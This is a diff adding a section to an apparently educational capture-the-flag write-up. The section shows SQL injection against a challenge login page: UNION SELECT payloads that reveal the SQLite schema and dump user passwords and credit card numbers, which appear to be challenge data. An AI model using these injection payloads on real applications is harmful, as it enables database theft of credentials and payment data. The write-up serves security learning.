@@ -335,3 +335,71 @@ Since `authenticated` is being checked like a boolean, any value other than `0` 
 
 Using the input `1234567890ab0` will fill password with the chars `"1234567890ab"` while the `char` `'0'` will be read into `authenticated`, since `authenticated` is an `int` this means `'0'` will be cast to its ASCII value 48.
 
+
+### Input Validation
+#### SQL Login (50 points)
+Attempting an SQL injection by escaping the quotes (e.g. input `'`), we get error messages showing the SQL command being executed is: 
+
+```SQL
+SELECT username, password FROM users WHERE username='farnsworth' AND password='{INPUT}'
+```
+
+Note the `username` in question could be different.
+So we can easily escape and use a UNION attack to extract data from the database. The simplest is 
+
+```SQL
+' UNION SELECT username,password FROM users WHERE username = 'farnsworth' --
+```
+
+We can also extract more information about the database by first determining what flavor of SQL is being used, which in this case turns out to be SQLite, since it doesn't report an error for using the function `sqlite_version()`. It makes sense for an SQLite instance to be used for a small hacking challenge.
+- [Tips For Determining SQL Flavor](https://stackoverflow.com/questions/65306224/determine-flavor-of-sql-being-used)
+- [SQL injection payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)
+
+We can get the database schema like so:
+
+```SQL
+' UNION SELECT sql,NULL FROM sqlite_master WHERE sql NOT NULL --
+```
+
+This shows us we have 2 tables:
+
+```SQL
+CREATE TABLE credit_cards (username text, card text, cvv integer, exp text)
+CREATE TABLE users (username text, password text)
+```
+
+And so we can dump the entire database:
+
+```SQL
+' UNION SELECT '| ' || rowid || ' | ' || username || ' | ' || password || ' |',NULL FROM users --
+```
+
+and
+
+```SQL
+' UNION SELECT '| ' || rowid || ' | ' || username || ' | ' || card || ' | ' || cvv || ' | ' || exp || ' |' FROM credit_cards --
+```
+
+Which gives us this information:
+`users`
+
+| rowid | username | password |
+|-|-|-|
+| 1 | admin | `Gu3ss_Myp4s%w0rd**` |
+| 2 | bender | `b1t3-my-shiny-m3t4l-4$$` |
+| 3 | fry | `w4ts-w/-th3-17-dungbeetles` |
+| 4 | farnsworth | `P4zuzu!!` |
+| 5 | scruffy | `Im_0n-br3ak` |
+| 6 | zoidberg | `sp4r3-ch4ng3#$$$` |
+
+`credit_cards`
+
+| rowid | username | card | cvv | exp |
+|-|-|-|-|-|
+| 1 | admin | 4300713381842928 | 318 | 06/2027 |
+| 2 | bender | 4768732694626948 | 669 | 07/2027 |
+| 3 | fry | 4385923563192160 | 368 | 11/2021 |
+| 4 | farnsworth | 4784981000802194 | 171 | 02/2027 |
+| 5 | scruffy | 4987327898009549 | 763 | 11/2019 |
+| 6 | zoidberg | 4912753912003772 | 440 | 07/2026 |
+
